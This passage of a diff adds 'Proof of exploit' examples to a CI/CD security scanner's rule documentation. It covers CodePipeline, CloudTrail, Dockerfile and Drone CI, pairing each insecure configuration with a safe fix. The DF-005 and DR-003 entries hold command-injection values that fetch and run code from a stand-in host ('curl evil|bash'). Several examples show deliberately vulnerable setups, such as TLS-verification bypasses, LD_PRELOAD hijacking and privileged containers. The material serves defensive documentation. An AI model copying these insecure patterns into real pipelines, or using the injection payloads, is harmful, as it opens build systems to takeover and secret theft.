 **Source:** [`CF-003`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).
 
@@ -3292,6 +5302,50 @@ Resources:
 **How this is detected.** A pipeline that goes Source -> Build -> Deploy with no Approval action means every commit on the source branch ships, with no human ack between code-merged and code-running-in-prod. The Manual approval action is the intentional pause point, combine with CP-005 for production-tagged stages specifically.
 
 **Recommendation.** Add a Manual approval action to a stage that precedes every Deploy stage that targets a production or sensitive environment.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline that goes Source -> Build
+# -> Deploy with no manual approval stage in between.
+# Every commit on the source branch reaches production
+# automatically. A compromised source branch (force
+# push, malicious co-maintainer, leaked CodeCommit
+# credential) ships straight to prod.
+import boto3
+cp = boto3.client('codepipeline')
+cp.create_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [{'actionTypeId': {'category': 'Source', ...}}]},
+            {'name': 'Build', 'actions': [{'actionTypeId': {'category': 'Build', ...}}]},
+            {'name': 'Deploy', 'actions': [{'actionTypeId': {'category': 'Deploy', ...}}]},
+        ],
+        # ...
+    }
+)
+
+# Safe: add a manual approval stage before Deploy. A
+# human reviewer approves each release; an SNS topic
+# can notify the approval group when a release is
+# awaiting decision.
+cp.update_pipeline(
+    pipeline={
+        'name': 'release',
+        'stages': [
+            {'name': 'Source', 'actions': [...]},
+            {'name': 'Build', 'actions': [...]},
+            {'name': 'Approve', 'actions': [{
+                'name': 'manual-approval',
+                'actionTypeId': {'category': 'Approval',
+                                 'owner': 'AWS',
+                                 'provider': 'Manual', 'version': '1'}}]},
+            {'name': 'Deploy', 'actions': [...]},
+        ],
+    }
+)
+```
 
 **Source:** [`CP-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3327,6 +5381,49 @@ Resources:
 
 **Recommendation.** Migrate to owner=AWS, provider=CodeStarSourceConnection and reference a CodeConnections connection ARN.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline source action of type
+# ``ThirdParty`` / ``GitHub`` (v1). This is the legacy
+# integration that stores a long-lived OAuth token on
+# the action configuration. The token has whatever
+# scope the granting GitHub user had, never rotates,
+# and isn't directly revocable from the AWS side.
+import boto3
+cp = boto3.client('codepipeline')
+# Action shape (from get_pipeline):
+{
+    'actionTypeId': {
+        'category': 'Source',
+        'owner': 'ThirdParty',
+        'provider': 'GitHub',
+        'version': '1',
+    },
+    'configuration': {'OAuthToken': 'ghp_long_lived...'}
+}
+
+# Safe: migrate to ``owner: AWS`` with the
+# ``CodeStarSourceConnection`` provider. The action
+# references a CodeConnections (formerly CodeStar) ARN;
+# the GitHub user can revoke the connection, AWS
+# refreshes the underlying token, and the action
+# configuration no longer carries a long-lived secret.
+{
+    'actionTypeId': {
+        'category': 'Source',
+        'owner': 'AWS',
+        'provider': 'CodeStarSourceConnection',
+        'version': '1',
+    },
+    'configuration': {
+        'ConnectionArn': 'arn:aws:codestar-connections:us-east-1:123:connection/...',
+        'FullRepositoryId': 'myorg/myrepo',
+        'BranchName': 'main',
+    },
+}
+```
+
 **Source:** [`CP-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CP-005`: Production Deploy stage has no preceding ManualApproval <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-cp-005 }
@@ -3347,6 +5444,38 @@ Resources:
 
 **Recommendation.** On V2 pipelines, add an ``includes`` filter under the trigger's ``branches`` block (and optionally ``pullRequest.events``) so only PRs targeting specific branches run. Without a filter, any fork-PR can execute the pipeline's build and deploy stages.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodePipeline v2 PR trigger with no
+# branch filter accepts pull requests from every
+# branch. A fork-PR (or any branch a non-trusted
+# contributor can push to) triggers a build with the
+# pipeline's full role and access to production
+# artifacts.
+# triggers section of a pipeline definition:
+triggers:
+  - providerType: CodeStarSourceConnection
+    gitConfiguration:
+      sourceActionName: SourceAction
+      pullRequest:
+        - events: [OPEN, UPDATED]
+          # no branches filter
+
+# Safe: filter PR triggers to a specific branch (the
+# release / hotfix branch) so only PRs targeting that
+# branch fire the build. Fork PRs targeting feature
+# branches no longer trigger.
+triggers:
+  - providerType: CodeStarSourceConnection
+    gitConfiguration:
+      sourceActionName: SourceAction
+      pullRequest:
+        - events: [OPEN, UPDATED]
+          branches:
+            includes: [main, release/*]
+```
+
 **Source:** [`CP-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `CT-000`: CloudTrail API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-ct-000 }
@@ -3366,6 +5495,32 @@ Resources:
 **How this is detected.** CloudTrail is the only AWS-native source of record for management-plane API calls. A region with no active trail blinds incident responders: a pipeline compromise is invisible once the in-memory CloudWatch buffer rolls over.
 
 **Recommendation.** Create a CloudTrail trail that logs management events in this region and start logging. Without a trail, CodeBuild/CodePipeline/IAM API activity, including credential changes during a compromise, has no durable audit record.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: no active CloudTrail trail in the region.
+# AWS API calls aren't audited; an intruder's actions
+# leave no trace. Incident response can't tell what was
+# read, what was changed, or how the attacker got in.
+import boto3
+ct = boto3.client('cloudtrail', region_name='us-east-1')
+# Empty trail list:
+ct.list_trails()  # -> {'Trails': []}
+
+# Safe: a multi-region trail that logs every API call
+# to a versioned, log-file-validation-enabled S3 bucket
+# with object-lock retention. Pair with CloudWatch
+# alarms on common compromise signals.
+ct.create_trail(
+    Name='org-wide-trail',
+    S3BucketName='org-cloudtrail-logs',
+    IsMultiRegionTrail=True,
+    IncludeGlobalServiceEvents=True,
+    EnableLogFileValidation=True,
+)
+ct.start_logging(Name='org-wide-trail')
+```
 
 **Source:** [`CT-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -3537,6 +5692,30 @@ CMD ["python3", "/app/app.py"]
 
 - ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ADD <url>`` pulls a remote blob into the
+# image at build time with no integrity check. A MITM
+# (compromised proxy, BGP hijack on the mirror) or a
+# host compromise substitutes the file; the build commits
+# the substituted bytes into a layer.
+FROM ubuntu@sha256:abc123...
+ADD https://internal-mirror.example.com/installer.tar.gz /tmp/
+RUN tar -xzf /tmp/installer.tar.gz && /tmp/install.sh
+
+# Safe: ``RUN curl`` to a tempfile, ``sha256sum -c`` against
+# a known-good digest, then extract / execute. The verify
+# step fails loud if the bytes don't match.
+FROM ubuntu@sha256:abc123...
+RUN curl -fsSL https://internal-mirror.example.com/installer.tar.gz \
+      -o /tmp/installer.tar.gz \
+    && echo 'a1b2c3d4...  /tmp/installer.tar.gz' | sha256sum -c - \
+    && tar -xzf /tmp/installer.tar.gz \
+    && /tmp/install.sh \
+    && rm /tmp/installer.tar.gz
+```
+
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }
@@ -3581,6 +5760,27 @@ RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
 **How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.
 
 **Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an
+# unquoted variable, gives the value full shell-grammar
+# reach. A build arg passed via ``docker build --build-arg
+# BUILD_CMD='echo hi;curl evil|bash'`` runs the curl in
+# the build context.
+FROM alpine@sha256:abc123...
+ARG BUILD_CMD
+RUN eval "$BUILD_CMD"
+
+# Safe: replace dynamic shell evaluation with a script you
+# own that validates the arg against an allow-list, or
+# remove the indirection entirely (hard-code the build
+# steps).
+FROM alpine@sha256:abc123...
+ARG TARGET=staging
+RUN ./scripts/build-for-target.sh "$TARGET"
+```
 
 **Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -3642,6 +5842,28 @@ RUN --mount=type=secret,id=api_key \
 
 **Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``RUN docker run --privileged`` (or
+# ``--cap-add=SYS_ADMIN``) during image build requires
+# privileged-mode on the BuildKit daemon AND grants the
+# nested container full kernel access. A compromise of
+# the inner build step escapes to the BuildKit host.
+FROM ubuntu@sha256:abc123...
+RUN docker run --privileged \
+      -v /var/run/docker.sock:/var/run/docker.sock \
+      myorg/inner-builder:latest ./inner-build.sh
+
+# Safe: don't nest privileged docker invocations inside
+# RUN. Use a multi-stage build instead — each stage is
+# its own root filesystem; no host-kernel access required.
+FROM myorg/inner-builder@sha256:abc123... AS builder
+RUN ./inner-build.sh
+FROM ubuntu@sha256:abc123...
+COPY --from=builder /out/ /app/
+```
+
 **Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-009`: ADD used where COPY would suffice <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-009 }
@@ -3682,6 +5904,32 @@ RUN --mount=type=secret,id=api_key \
 
 **Recommendation.** Drop ``sudo`` from the ``RUN``. Either the build is already running as root (the default before any ``USER`` directive), in which case ``sudo`` is no-op noise, or the build switched to a non-root ``USER`` and needs root for a specific step, in which case temporarily revert with ``USER root`` for that ``RUN`` and switch back afterward.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``RUN sudo apt-get install -y curl`` requires
+# the image to ship sudo (extra attack surface) AND runs
+# as a non-root user that has sudo rights. A compromise
+# at runtime can ``sudo`` to root inside the container,
+# defeating the non-root-user posture.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y sudo curl
+RUN useradd -m app && adduser app sudo
+USER app
+RUN sudo apt-get install -y jq    # privilege escalation primitive in image
+
+# Safe: do every privileged step BEFORE the ``USER``
+# directive, while still root. Drop sudo from the image
+# entirely. The final ``USER app`` runs without any path
+# back to root.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update \
+    && apt-get install -y curl jq \
+    && useradd -m app \
+    && rm -rf /var/lib/apt/lists/*
+USER app
+```
+
 **Source:** [`DF-012`](../providers/dockerfile.md#df-012) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-013`: EXPOSE declares sensitive remote-access port <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-013 }
@@ -3694,6 +5942,30 @@ RUN --mount=type=secret,id=api_key \
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``EXPOSE 22`` advertises an SSH port on the
+# image. Even if no sshd is actually running, the metadata
+# signals to operators that SSH is part of the contract,
+# encouraging port-forward / publish patterns that put
+# the container's SSH on the network. Container SSH
+# bypasses the cluster's audit and identity layers.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y openssh-server
+EXPOSE 22
+CMD ["/usr/sbin/sshd", "-D"]
+
+# Safe: drop the SSH server. Use ``kubectl exec`` (or
+# ``docker exec``) for interactive debugging — both go
+# through the cluster's RBAC / audit pipeline, with no
+# network-exposed SSH surface.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y --no-install-recommends app
+EXPOSE 8080
+CMD ["/usr/local/bin/app"]
+```
+
 **Source:** [`DF-013`](../providers/dockerfile.md#df-013) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-014`: WORKDIR set to a system / kernel filesystem path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-014 }
@@ -3703,6 +5975,29 @@ RUN --mount=type=secret,id=api_key \
 **How this is detected.** Subsequent directives in the Dockerfile (``COPY src dest``, ``RUN`` writes, ``ADD …``) resolve relative paths against the active ``WORKDIR``. A ``WORKDIR /sys`` followed by ``COPY conf.txt config.txt`` writes into the kernel's sysfs surface, at best a build-time error, at worst a container-escape primitive that lets a compromised step manipulate cgroups, devices, or kernel config.
 
 **Recommendation.** Move ``WORKDIR`` to a dedicated app directory (``/app``, ``/srv/app``, ``/opt/<service>``). System paths like ``/sys``, ``/proc``, ``/dev``, ``/etc``, ``/`` and the ``root`` home are not application directories, pointing the working dir at one means subsequent ``COPY`` / ``RUN`` writes target kernel-exposed namespaces or admin-only configuration.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``WORKDIR /proc`` (or ``/sys`` / ``/etc``)
+# sets the runtime working directory to a kernel-managed
+# filesystem. Relative file writes from the app then
+# attempt to write into kernel sysfs / procfs; at best
+# the writes fail silently, at worst they cause runtime
+# misbehavior on shared host kernel resources.
+FROM alpine@sha256:abc123...
+WORKDIR /proc
+COPY app /usr/local/bin/app
+CMD ["app"]
+
+# Safe: a normal application directory under ``/app`` or
+# ``/srv``. The app writes its own files in an isolated
+# location.
+FROM alpine@sha256:abc123...
+WORKDIR /app
+COPY app /usr/local/bin/app
+CMD ["app"]
+```
 
 **Source:** [`DF-014`](../providers/dockerfile.md#df-014) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -3770,6 +6065,33 @@ RUN --mount=type=secret,id=api_key \
 
 - Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``COPY .npmrc`` (or ``.aws/credentials`` /
+# ``.kube/config`` / ``.netrc``) bakes the host's local
+# credential file into the image. Anyone who pulls the
+# image extracts the credential via
+# ``docker save | tar xf -``; the secret rides the image
+# everywhere it's distributed.
+FROM node@sha256:abc123...
+WORKDIR /app
+COPY . .
+COPY .npmrc /root/.npmrc    # carries auth token into layer
+RUN npm ci && npm run build
+
+# Safe: use BuildKit's ``--mount=type=secret`` so the
+# credential file is mounted only for the RUN that needs
+# it. The secret never lands in any layer; ``docker save``
+# returns an image with no trace.
+# syntax=docker/dockerfile:1.7
+FROM node@sha256:abc123...
+WORKDIR /app
+COPY . .
+RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
+    npm ci && npm run build
+```
+
 **Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }
@@ -3786,6 +6108,32 @@ RUN --mount=type=secret,id=api_key \
 
 - An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ARG NPM_TOKEN`` declares a build argument
+# whose name signals it carries a credential. Build args
+# are visible in ``docker history``, so the value (passed
+# via ``--build-arg NPM_TOKEN=...``) lands in image
+# metadata and leaks the same way as a literal ENV.
+FROM node@sha256:abc123...
+ARG NPM_TOKEN
+RUN npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" \
+    && npm ci
+
+# Safe: use BuildKit secret mounts. The token is read
+# from a file at RUN time only; nothing about the token
+# (not even its existence as a build arg) lands in
+# ``docker history``.
+# syntax=docker/dockerfile:1.7
+FROM node@sha256:abc123...
+RUN --mount=type=secret,id=npm_token \
+    NPM_TOKEN=$(cat /run/secrets/npm_token) && \
+    npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" && \
+    npm ci && \
+    npm config delete //registry.npmjs.org/:_authToken
+```
+
 **Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }
@@ -3799,6 +6147,31 @@ RUN --mount=type=secret,id=api_key \
 **Known false positives.**
 
 - An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so any network attacker between the
+# build and the registry can substitute a wheel. The
+# ``--trusted-host`` flag silences pip's hash
+# verification for the named host too.
+FROM python@sha256:abc123...
+RUN pip install \
+      --index-url http://internal-pypi.example.com/simple \
+      --trusted-host internal-pypi.example.com \
+      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image's trust store;
+# ``--require-hashes`` enforces hash pinning.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    pip install \
+      --index-url https://internal-pypi.example.com/simple \
+      --require-hashes -r requirements.txt
+```
 
 **Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -3828,6 +6201,27 @@ RUN --mount=type=secret,id=api_key \
 **Known false positives.**
 
 - Sanitizer-instrumented images (``LD_PRELOAD=libasan.so``) and APM agent hooks (``LD_PRELOAD=/opt/dynatrace/...``) are legitimate. Suppress the finding for the specific Dockerfile with a one-line rationale; the rule deliberately catches the pattern because the same shape is the standard loader-hijack escalation primitive.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV LD_PRELOAD=/tmp/lib.so`` (or
+# ``LD_LIBRARY_PATH`` to a writable directory,
+# ``PYTHONPATH``, ``CLASSPATH``) configures the dynamic
+# loader to consult an attacker-influencable location
+# at runtime. A write into ``/tmp`` then runs arbitrary
+# code in every process the container starts.
+FROM ubuntu@sha256:abc123...
+ENV LD_PRELOAD=/tmp/libhook.so
+CMD ["/usr/local/bin/app"]
+
+# Safe: no loader-hijack env vars in the image. If a
+# library actually needs to override loader paths, do
+# it inside the app's startup logic against a fixed,
+# read-only path, not via process env.
+FROM ubuntu@sha256:abc123...
+CMD ["/usr/local/bin/app"]
+```
 
 **Source:** [`DF-023`](../providers/dockerfile.md#df-023) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -3932,6 +6326,30 @@ If the internal registry / API genuinely has a self-signed cert, install the CA 
 
 - Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
+# disables TLS verification for every Node.js process
+# in the container. Any HTTPS call (npm install at
+# runtime, internal API call, vendor SDK) is MITM-able.
+FROM node@sha256:abc123...
+ENV NODE_TLS_REJECT_UNAUTHORIZED=0
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+
+# Safe: install the missing CA into the image trust
+# store and leave ``NODE_TLS_REJECT_UNAUTHORIZED`` at
+# its safe default. Node honors the system CA bundle.
+FROM node@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+```
+
 **Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }
@@ -3945,6 +6363,30 @@ Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS b
 **Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.
 
 If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
+# verification for every Python process in the
+# container. pip, requests-via-urllib3, every API call
+# now ignores certificate validity.
+FROM python@sha256:abc123...
+ENV PYTHONHTTPSVERIFY=0
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: install the missing CA, keep PYTHONHTTPSVERIFY
+# at the safe default. Python's ``ssl`` module reads
+# from the system CA store.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
 
 **Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -3964,6 +6406,27 @@ Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests T
 
 If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
+# certificate verification for every clone / fetch. A
+# MITM substitutes the remote's contents on the next
+# git operation.
+FROM alpine/git@sha256:abc123...
+ENV GIT_SSL_NO_VERIFY=1
+RUN git clone https://internal.example.com/repo.git /src
+
+# Safe: install the missing CA, keep git's SSL
+# verification on. ``GIT_SSL_CAPATH`` / ``GIT_SSL_CAINFO``
+# can also be used to point git at a specific CA bundle
+# if updating the system trust store isn't an option.
+FROM alpine/git@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    git clone https://internal.example.com/repo.git /src
+```
+
 **Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }
@@ -3981,6 +6444,33 @@ A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificate
 **Recommendation.** Set ``ENV REQUESTS_CA_BUNDLE`` to the path of a real CA bundle (typically ``/etc/ssl/certs/ca-certificates.crt`` on Debian or ``/etc/ssl/cert.pem`` on Alpine), or unset it entirely so the ``requests`` library falls back to ``certifi``. Pointing the variable at ``/dev/null`` or an empty string is a documented anti-pattern: ``requests`` treats the empty / missing bundle as 'verify against nothing,' which silently accepts every certificate.
 
 The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
+# the empty string, or a non-existent path) neuters the
+# CA bundle Python's requests library consults. Every
+# HTTPS call requests makes silently fails verification
+# or accepts any cert.
+FROM python@sha256:abc123...
+ENV REQUESTS_CA_BUNDLE=/dev/null
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: point ``REQUESTS_CA_BUNDLE`` at the system trust
+# store (or leave it unset, in which case requests uses
+# certifi). Install internal CAs into the system store
+# rather than papering over with a null bundle.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
 
 **Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -4020,6 +6510,34 @@ If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope
 
 - Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``golang:1.21`` is a mutable tag. Docker Hub
+# (or any compromise of the publisher's account) repoints
+# the tag at a new image on the next 1.21.x patch release
+# and the next pipeline run pulls the swap silently.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang:1.21
+    commands:
+      - go test ./...
+
+# Safe: pin to the content-addressable digest. Renovate /
+# Dependabot bump the digest in reviewable PRs.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: test
+    image: golang@sha256:abc123...
+    commands:
+      - go test ./...
+```
+
 **Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-002`: Step runs with privileged: true <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-002 }
@@ -4029,6 +6547,37 @@ If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope
 **How this is detected.** Drone's ``privileged: true`` is a step-scoped switch that maps directly to ``docker run --privileged``. The rule fires on either steps or services declaring the flag. The agent admin can also globally allow / deny privileged steps via the trusted-flag on the repository, the rule doesn't try to reach into Drone's server config and assumes the worst (a malicious or accidentally-trusted repo) so a ``privileged: true`` in source is always a finding.
 
 **Recommendation.** Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the agent host. Most workloads that reach for it are Docker-in-Docker pipelines that can use a rootless alternative (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead. If the workload genuinely needs syscalls, scope down with explicit ``cap_add: [SYS_ADMIN]`` and an isolated runner pool, rather than blanket privileged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``privileged: true`` grants the step
+# container access to the host kernel's namespaces and
+# /dev. A workload compromise (poisoned image, build-
+# script RCE) escapes to the runner host and from there
+# to every other build sharing the runner.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: dind-build
+    image: docker:24
+    privileged: true
+    commands:
+      - docker build -t app .
+
+# Safe: use a rootless image builder (Kaniko, BuildKit
+# rootless) that produces images without privileged host
+# access. Drop ``privileged`` entirely.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: kaniko-build
+    image: gcr.io/kaniko-project/executor@sha256:abc123...
+    commands:
+      - /kaniko/executor --context=. --destination=registry/app:tag
+```
 
 **Source:** [`DR-002`](../providers/drone.md#dr-002) in the [Drone CI provider](../providers/drone.md).
 
@@ -4052,6 +6601,42 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 
 - Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, ``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for non-fork repos) aren't user-controllable and are safe to interpolate unquoted. Drone-template syntax can also appear in YAML strings outside ``commands:``; this rule only scopes itself to step command bodies, so an unquoted use in (say) ``settings.message:`` doesn't fire here, those land under DR-004 / SBOM-style audits.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a branch named ``feat;curl evil|bash;`` lands
+# verbatim in the shell command via the
+# ``${DRONE_BRANCH}`` template variable. The injected
+# ``curl`` runs in the step's shell context with the
+# step's full secret set in scope.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: alpine@sha256:abc123...
+    commands:
+      - echo "Building ${DRONE_BRANCH}"
+      - ./build.sh --branch ${DRONE_BRANCH}
+
+# Safe: assign the untrusted value to a local shell
+# variable, quote on every use, and pass as an argument
+# to a script you own. Drone's template substitution
+# happens BEFORE the shell sees the command, so the
+# defense has to be at the shell layer.
+kind: pipeline
+type: docker
+name: build
+steps:
+  - name: build
+    image: alpine@sha256:abc123...
+    environment:
+      BRANCH: ${DRONE_BRANCH}
+    commands:
+      - echo "Building $BRANCH"
+      - ./build.sh --branch "$BRANCH"
+```
+
 **Source:** [`DR-003`](../providers/drone.md#dr-003) in the [Drone CI provider](../providers/drone.md).
 
 ### `DR-004`: Literal credential in step environment / settings <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-dr-004 }
@@ -4065,6 +6650,44 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 **Known false positives.**
 
 - Configuration values that happen to use a credential-shaped key name but never carry a secret (``DOCKER_CONFIG=/dev/null`` to suppress credential loading) sometimes trip this rule. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader credential-vocab match still catches real leaks elsewhere in the pipeline.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal is committed to
+# the pipeline file. Any repo reader sees it; Drone's
+# build logs print it whenever the step echoes its
+# environment.
+kind: pipeline
